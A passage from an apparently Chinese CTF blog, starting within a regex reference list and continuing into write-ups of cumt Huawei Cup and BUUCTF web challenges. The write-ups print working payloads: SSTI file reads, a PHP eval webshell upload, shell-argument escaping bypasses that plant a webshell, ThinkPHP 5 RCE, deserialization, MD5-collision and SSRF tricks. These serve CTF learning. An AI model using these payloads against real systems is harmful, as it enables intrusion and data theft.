13. 非负整数：^\\d+$ 或 ^[1-9]\\d*|0$ 14. 非正整数：^-[1-9]\\d*|0$ 或 ^((-\\d+)|(0+))$ 15. 非负浮点数：^\\d+(\\.\\d+)?$ 或 ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0$ 16. 非正浮点数：^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$ 或 ^(-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*))|0?\\.0+|0$ 17. 正浮点数：^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$ 或 ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 18. 负浮点数：^-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*)$ 或 ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 19. 浮点数：^(-?\\d+)(\\.\\d+)?$ 或 ^-?([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0)$ 二、校验字符的表达式 1. 汉字：^[\\u4e00-\\u9fa5]&#123;0,&#125;$ //u4e00是unicode中第一个汉字编码 u9fa5是最后一个 2. 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$ //[A-Za-z0-9]可以匹配大小写字母数字 3. 长度为3-20的所有字符：^.&#123;3,20&#125;$ // .代表任意字符包括换行符 4. 由26个英文字母组成的字符串：^[A-Za-z]+$ 5. 由26个大写英文字母组成的字符串：^[A-Z]+$ 6. 由26个小写英文字母组成的字符串：^[a-z]+$ 7. 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ //与第二个表达式相同 8. 由数字、26个英文字母或者下划线组成的字符串：^\\w+$ 或 ^\\w&#123;3,20&#125;$ // \\w=[0-9A-Za-z_] 9. 中文、英文、数字包括下划线：^[\\u4E00-\\u9FA5A-Za-z0-9_]+$ 10. 中文、英文、数字但不包括下划线等符号：^[\\u4E00-\\u9FA5A-Za-z0-9]+$ 或 ^[\\u4E00-\\u9FA5A-Za-z0-9]&#123;2,20&#125;$ 11. 可以输入含有^%&amp;',;=?$\\\"等字符：[^%&amp;',;=?$\\x22]+ 12 禁止输入含有~的字符：[^~\\x22]+ //这里的 ^是非的意思 下面这些就不一一解释了，实在太多了有的还是重复。 三、特殊需求表达式 1. Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$ 2. 域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.? 3. InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$ 4. 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$ 5. 电话号码(\"XXX-XXXXXXX\"、\"XXXX-XXXXXXXX\"、\"XXX-XXXXXXX\"、\"XXX-XXXXXXXX\"、\"XXXXXXX\"和\"XXXXXXXX)：^(\\(\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$ 6. 国内电话号码(0511-4405222、021-87888822)：\\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\d&#123;7&#125; 7. 身份证号(15位、18位数字)：^\\d&#123;15&#125;|\\d&#123;18&#125;$ 8. 短身份证号码(数字、字母x结尾)：^([0-9])&#123;7,18&#125;(x|X)?$ 或 ^\\d&#123;8,18&#125;|[0-9x]&#123;8,18&#125;|[0-9X]&#123;8,18&#125;?$ 9. 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]&#123;4,15&#125;$ 10. 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w&#123;5,17&#125;$ 11. 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).&#123;8,10&#125;$ 12. 日期格式：^\\d&#123;4&#125;-\\d&#123;1,2&#125;-\\d&#123;1,2&#125; 13. 一年的12个月(01～09和1～12)：^(0?[1-9]|1[0-2])$ 14. 一个月的31天(01～09和1～31)：^((0?[1-9])|((1|2)[0-9])|30|31)$ 14 钱的输入格式： 15 1.有四种钱的表示形式我们可以接受:\"10000.00\" 和 \"10,000.00\", 和没有 \"分\" 的 \"10000\" 和 \"10,000\"：^[1-9][0-9]*$ 16 2.这表示任意一个不以0开头的数字,但是,这也意味着一个字符\"0\"不通过,所以我们采用下面的形式：^(0|[1-9][0-9]*)$ 17 3.一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0|-?[1-9][0-9]*)$ 18 4.这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧.下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 19 5.必须说明的是,小数点后面至少应该有1位数,所以\"10.\"是不通过的,但是 \"10\" 和 \"10.2\" 是通过的：^[0-9]+(.[0-9]&#123;2&#125;)?$ 20 6.这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]&#123;1,2&#125;)?$ 21 7.这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*(.[0-9]&#123;1,2&#125;)?$ 22 8.1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+|[0-9]&#123;1,3&#125;(,[0-9]&#123;3&#125;)*)(.[0-9]&#123;1,2&#125;)?$ 23 备注：这就是最终结果了,别忘了\"+\"可以用\"*\"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 24 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x|X][m|M][l|L]$ 25 中文字符的正则表达式：[\\u4e00-\\u9fa5] 26 双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 27 空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行) 28 HTML标记的正则表达式：&lt;(\\S*?)[^&gt;]*&gt;.*?&lt;/\\1&gt;|&lt;.*? /&gt; (网上流传的版本太糟糕，上面这个也仅仅能部分，对于复杂的嵌套标记依旧无能为力) 29 首尾空白字符的正则表达式：^\\s*|\\s*$或(^\\s*)|(\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 30 腾讯QQ号：[1-9][0-9]&#123;4,&#125; (腾讯QQ号从10000开始) 31 中国邮政编码：[1-9]\\d&#123;5&#125;(?!\\d) (中国邮政编码为6位数字) 32 IP地址：\\d+\\.\\d+\\.\\d+\\.\\d+ (提取IP地址时有用) 33 IP地址：((?:(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)\\\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\\\d|[01]?\\\\d?\\\\d)) 34 将url的协议，主机名，端口号，文件路径放到数组中: var str = \"http://www.runoob.com:80/html/html-tutorial.html\"; var patt1 = /(\\w+):\\/\\/([^/:]+)(:\\d*)?([^# ]*)/; //四个子表达式组合在一起，(\\w+): 匹配字符串开始到: ([^/:]+) 匹配非/ 非:后的内容 (:\\d*)? 匹配:后的若干数字且表达式重复一次或多次 ([^# ]*) 匹配不包括#或空格字符的任何字符序列 总结正则表达式的功能还是很强大的，想要写出能准确匹配目标的表达式还是需要认真学习的，但是代码审计中的要求没那么严格，只需要能看懂表达式匹配了哪些内容即可。","tags":[]},{"title":"cumt华为杯","date":"2020-10-28T12:26:38.000Z","path":"2020/10/28/华为杯/","text":"cumt_华为杯经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了 webdoge真签到题，抽个奖就给出了flag babyflask刚进入页面，只有一张图片，查看源码也没发现什么 就是了模板注入 url+&#123;&#123;7*7&#125;&#125;Copy 页面出现404报错，并且显示的是url+49，确定是模板注入 &#123;&#123;''.__class__.__mro__[2].__subclasses__()&#125;&#125; 查看模块时，发现存在waf 经过测试发现是过滤了[] 于是使用 &#123;&#123;''.__class__.__mro__.__getitem__(2).__subclasses__()&#125;&#125; 存在file模块 用read读取文件内容 exp: ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag').read()Copy 参考链接：https://xz.aliyun.com/t/8029 VulnCMS这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。 这里给出大神的做法 Hodor这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。 看到WP是大S绕过，涨知识了 &lt;?php Class Source &#123; public function __toString() &#123; return highlight_file('license.txt', true).highlight_file($this-&gt;source, true); &#125; &#125; function easy_check($str) &#123; //echo $str; if (preg_match(\"/flag/i\", $str, $matches)) &#123; return false; &#125; return true; &#125; if(isset($_GET['source']))&#123; $s = new Source(); $s-&gt;source = __FILE__; echo $s; exit; &#125; $todos = []; if(isset($_COOKIE['todos']))&#123; if(!easy_check($_COOKIE['todos'])) &#123; echo \"Hacker!\\n\"; &#125; else &#123; $c = $_COOKIE['todos']; $h = substr($c, 0, 32); $m = substr($c, 32); if(md5($m) === $h)&#123; $todos = unserialize($m); &#125; &#125; &#125; if(isset($_POST['text']))&#123; $todo = $_POST['text']; $todos[] = $todo; $m = serialize($todos); $h = md5($m); setcookie('todos', $h.$m); header('Location: '.$_SERVER['REQUEST_URI']); exit; &#125; // flag is in flag.php ?Copy exp echo md5('a:2:&#123;i:0;s:3:\"123\";i:1;O:6:\"Source\":1: &#123;s:6:\"source\";S:8:\"\\66lag.php\";&#125;&#125;'); echo urlencode('ae5860e508aaf353a9ad78ac246f46fba:2: &#123;i:0;s:3:\"123\";i:1;O:6:\"Source\":1:&#123;s:6:\"source\";S:8:\"\\66lag.php\";&#125;&#125;');Copy 参考 https://blog.csdn.net/SmileAndFun/article/details/108497183 webcms是一个博客管理的网站，其实也是个原题，考察点是文件上传 漏洞点在图片中上传图片的位置 随便上传一张图片试试，抓包结果如下，几个注意点 1.filetype规定了文件的类型 2.上传时，将图片保存为了base64形式 所以上传一句话木马的时候要注意修改对应的位置 一句话木马类型为php,则filetype改为php 内容为密码为cmd一句话木马，对应的base64编码PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg== 上传成功，访问保存的路径：http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php POST: cmd=system(\"cat /flag\"); 或者蚁剑连接，密码cmdCopy MiscMIsc部分基本都是队友做的，好像也不是太难 伪web真是伪web。。。 直接在文件里搜索就能到flag 搜索关键词cmut，flag所在文件夹为html\\include\\include.php","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"},{"name":"ssti","slug":"ssti","permalink":"https://sunzhengyu99.github.io/tags/ssti/"},{"name":"文件上传","slug":"文件上传","permalink":"https://sunzhengyu99.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"buuctf-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"buuctf-z7z8","date":"2020-10-08T12:34:58.000Z","path":"2020/10/08/buuoj-z7z8/","text":"这篇是buuctf上的其他题型的集合 buuctf-z7z8 [BUUCTF 2018]Online Tool&lt;?php if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) &#123; $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR']; &#125; if(!isset($_GET['host'])) &#123; highlight_file(__FILE__); &#125; else &#123; $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\"glzjin\". $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); //创建了路径 chdir($sandbox); echo system(\"nmap -T5 -sT -Pn --host-timeout 2 -F \".$host); &#125; 前面的两段代码没啥用，主要是后面处理 host的过程 1.知识储备 escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;|*?~&lt;&gt;^()[]{}$,\\x0A和\\xFF。‘和“仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!` 字符都会被空格代替。 namp命令 -T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4-sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试-Pn :禁用ping-host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。-F :快速扫描模式，只扫描在nmap-services文件中列出的端口。 漏洞点在这 echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host); 这有个system来执行命令，而且有传参，肯定是利用这里了 2.构造payload 传入的参数是：172.17.0.2&#39; -v -d a=1 经过escapeshellarg处理后变成了&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1&#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl &#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的&#39;没有被转义，与再后面的&#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1&#39;，即向172.17.0.2\\发起请求，POST 数据为a=1&#39; 回到mail中，我们的 payload 最终在执行时变成了&#39;-fa&#39;\\\\&#39;&#39;\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)@a.com\\&#39;，分割后就是-fa\\(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com&#39;，最终的参数就是这样被注入的。 参考 需要绕过上面的两个函数，先试试两个函数的作用 &lt;?php $host = \" 1'shellcode \"; $host = escapeshellarg($host); echo $host; echo \"\\n\"; $host = escapeshellcmd($host); echo $host; ?&gt; ' 1'\\''shellcode ' ' 1'\\\\''shellcode \\' 构造的一句话木马为：&#39; &lt;?php @shellcode?&gt; -oG hack.php &#39; 运行结果为：&#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; 这里的单引号都是成对出现的，所以没影响 payload: ?host=' &lt;?php @shellcode?&gt; -oG hack.php ' 上传文件的保存路径，利用蚁剑链接一下 参考： https://blog.csdn.net/qq_26406447/article/details/100711933 https://blog.csdn.net/zhangxiansheng12/article/details/107216167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase (写的有点乱) [BJDCTF 2nd]old-hack打开页面出现了提示 这里应该是php5的漏洞利用，和攻防世界的一道题比较像传送门 先看看报错信息:1 url+?s=1 php版本为5.0.23，上网搜了一下这版本的漏洞 https://xz.aliyun.com/t/3845 直接构造payload，读取目录 url POST:_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls / 看到了flag文件 读取flag url POST:_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /flag [MRCTF2020]Ez_bypassI put something in F12 for you include 'flag.php'; $flag='MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'; if(isset($_GET['gg'])&amp;&amp;isset($_GET['id'])) &#123; $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo 'You got the first step'; if(isset($_POST['passwd'])) &#123; $passwd=$_POST['passwd']; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); &#125; else &#123; echo \"can you think twice??\"; &#125; &#125; else &#123; echo 'You can not get it !'; &#125; &#125; else &#123; die('only one way to get the flag'); &#125; &#125; else &#123; echo \"You are not a real hacker!\"; &#125; &#125; else &#123; die('Please input first'); &#125; &#125; 先F12找一找提示，原来就是格式化好的源码 if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) 直接使用数组绕过，也可以使用md5强碰撞的两字符串 param1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 param2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 if (!is_numeric($passwd))弱类型比较，使用1234567a绕过 payload: ?id=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;gg=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2 POST:passwd=1234567a 或者 ?id[]=1&amp;gg[]=2 POST:passwd=1234567a [安洵杯 2019]easy_weburl中包含/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=，仔细看TXpVek5UTTFNbVUzTURabE5qYz0其实是base64编码，解码还是base64，继续解码为一串十六进制的字符，内容为555.png 通过555.png--&gt;TXpVek5UTTFNbVUzTURabE5qYz0可以类型的构造出index.php查询代码 index.php 696e6465782e706870 Njk2ZTY0NjU3ODJlNzA2ODcw TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 base64解码后 &lt;?php error_reporting(E_ALL || ~ E_NOTICE); header('content-type:text/html;charset=utf-8'); $cmd = $_GET['cmd']; if (!isset($_GET['img']) || !isset($_GET['cmd'])) header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='); $file = hex2bin(base64_decode(base64_decode($_GET['img']))); $file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file); if (preg_match(\"/flag/i\", $file)) &#123; echo '&lt;img src =\"./ctf3.jpeg\"&gt;'; die(\"xixiï½ no flag\"); &#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\"; //将555.png的内容以base64形式显示 echo \"&lt;br&gt;\"; &#125; echo $cmd; echo \"&lt;br&gt;\"; if (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) &#123; //cmd参数进行了过滤 echo(\"forbid ~\"); echo \"&lt;br&gt;\"; &#125; else &#123; if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) &#123;// md5强碰撞 echo `$cmd`; &#125; else &#123; echo (\"md5 is funny ~\"); &#125; &#125; ?&gt; &lt;html&gt; &lt;style&gt; body&#123; background:url(./bj.png) no-repeat center center; background-size:cover; background-attachment:fixed; background-color:#CCCCCC; &#125; &lt;/style&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; $file = hex2bin(base64_decode(base64_decode($_GET['img']))); //这里将img的值两次base64解码后赋值给了file变量 ... $txt = base64_encode(file_get_contents($file));//这里存在file_get_contents()函数，直接读取文件的内容 这题还对一些系统命令进行了过滤，这里需要想办法绕过 ls，不可以使用，但是dir没有过滤，可以使用dir%20/读取目录 cat被过滤了，但是可以使用ca\\t绕过，ca\\t%20/flag (linux命令中可以加) if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) md5强碰撞的字符串 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 &amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 参考： https://www.jianshu.com/p/21e3e1f74c08 [BJDCTF2020]Mark loves cat变量覆盖 &lt;?php include 'flag.php'; $yds = \"dog\"; $is = \"cat\"; $handsome = 'yds'; foreach($_POST as $x =&gt; $y)&#123;//$flag=flag $$x = $y; &#125; $flag = flag foreach($_GET as $x =&gt; $y)&#123; //yds=flag $$x = $$y; //$yds = $flag &#125; foreach($_GET as $x =&gt; $y)&#123; if($_GET['flag'] === $x &amp;&amp; $x !== 'flag')&#123; // yds=flag exit($handsome); &#125; &#125; if(!isset($_GET['flag']) &amp;&amp; !isset($_POST['flag']))&#123; exit($yds); &#125; if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag')&#123; exit($is); &#125; echo \"the flag is: \".$flag; poyload: ?yds=flag POST: $flag=flag [BJDCTF2020]The mystery of ip进入页面不知道干啥，随便点点，到flag.php时显示了IP地址 查看原码发现提示&lt;!-- Do you know why i know your ip? --&gt; 猜测这里是跟XFF有关，于是修改XFF:127.0.0.1，果然页面显示的就是IP是127.0.0.1 这里就想到了XFF注入，是否可以类似于XFF注入，将系统名令注入进去 首先试试system(&quot;ls /&quot;),但是发现没有被执行，于是家上括号{system(&quot;ls /&quot;)}，这次执行成功 最后获取flag, {system(cat /flag)} [网鼎杯 2020 朱雀组]phpweb&lt;?php $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") &#123; return $result; &#125; else &#123;return \"\";&#125; &#125; class Test &#123; var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() &#123; if ($this-&gt;func != \"\") &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(\"Hacker...\"); &#125; &#125; ?&gt; exp &lt;?php class Test &#123; var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() &#123; if ($this-&gt;func != \"\") &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $a = new Test(); $a-&gt;p=\"cat /tmp/flagoefiu4r93\"; $a-&gt;func=\"system\"; print(urlencode(serialize($a))); ?&gt; [De1CTF 2019]SSRF Me#! /usr/bin/env python #encoding=utf-8 from flask import Flask from flask import request import socket import hashlib import urllib import sys import os import json reload(sys) sys.setdefaultencoding('latin1') app = Flask(__name__) secert_key = os.urandom(16) class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result['code'] = 500 if (self.checkSign()): if \"scan\" in self.action: tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w') resp = scan(self.param) if (resp == \"Connection Timeout\"): result['data'] = resp else: print resp tmpfile.write(resp) tmpfile.close() result['code'] = 200 if \"read\" in self.action: f = open(\"./%s/result.txt\" % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read() if result['code'] == 500: result['data'] = \"Action Error\" else: result['code'] = 500 result['msg'] = \"Sign Error\" return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. @app.route(\"/geneSign\", methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(\"param\", \"\")) action = \"scan\" return getSign(action, param) @app.route('/De1ta',methods=['GET','POST']) def challenge(): action = urllib.unquote(request.cookies.get(\"action\")) param = urllib.unquote(request.args.get(\"param\", \"\")) sign = urllib.unquote(request.cookies.get(\"sign\")) ip = request.remote_addr if(waf(param)): return \"No Hacker!!!!\" task = Task(action, param, sign, ip) return json.dumps(task.Exec()) @app.route('/') def index(): return open(\"code.txt\",\"r\").read() def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return \"Connection Timeout\" def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() def md5(content): return hashlib.md5(content).hexdigest() def waf(param): check=param.strip().lower() if check.startswith(\"gopher\") or check.startswith(\"file\"): return True else: return False if __name__ == '__main__': app.debug = False app.run(host='0.0.0.0',port=80) [SUCTF 2019]Pythonginx题目给出了源码 @app.route('/getUrl', methods=['GET', 'POST']) def getUrl(): url = request.args.get(\"url\") # 获取get提交的url参数 host = parse.urlparse(url).hostname #获取url中的主机名 if host == 'suctf.cc': return \"我扌 your problem? 111\" parts = list(urlsplit(url)) #将url分隔开 协议类型 主机名 文件路径 存入列表 parts[1]为主机名 host = parts[1] if host == 'suctf.cc': return \"我扌 your problem? 222 \" + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) #将主机名以.为分割 进行utf-8解码 parts[1] = '.'.join(newhost) #重新组成主机名 #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname # 获取新的主机名 if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return \"我扌 your problem? 333\" &lt;!-- Dont worry about the suctf.cc. Go on! --&gt; &lt;!-- Do you know the nginx? --&gt; 考察点1： 2019black hat一个议题 https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf 在unicode中字符℀(U+2100)，当IDNA处理此字符时，会将℀变成a/c，因此当你访问此url时，dns服务器会自动将url重定向到另一个网站。如果服务器引用前端url时，只对域名做了限制，那么通过这种方法，我们就可以轻松绕过服务器对域名的限制了。 考察点2: Nginx服务器 https://zhuanlan.zhihu.com/p/34943332，这篇文章介绍的很详细 这里只要知道nginx服务器的主要文件路径 配置文件存放目录：/etc/nginx 主配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx 配置文件目录为：/usr/local/nginx/conf/nginx.conf //这题要用到的路径 这里要读取的是文件，所以使用的file协议 直接够造 file://suctf.cc/usr/local/nginx/conf/nginx.conf 利用漏洞改为 file://suctf.c℆sr/local/nginx/conf/nginx.conf 给出flag路径 server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125; 构造 file://suctf.c℆sr/fffffflag 拿到flag 为了直观感受url处理过程，写了脚本 from urllib import parse from urllib.parse import urlsplit, urlunsplit url= \"file://suctf.c℆sr/local/nginx/conf/nginx.conf\" host = parse.urlparse(url).hostname #print(host) parts = list(urlsplit(url)) print(parts) newhost=[] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) print(newhost) parts[1] = '.'.join(newhost) print(parts) finalUrl = urlunsplit(parts).split(' ')[0] print(finalUrl) 结果 ['file', 'suctf.c℆sr', '/local/nginx/conf/nginx.conf', '', ''] 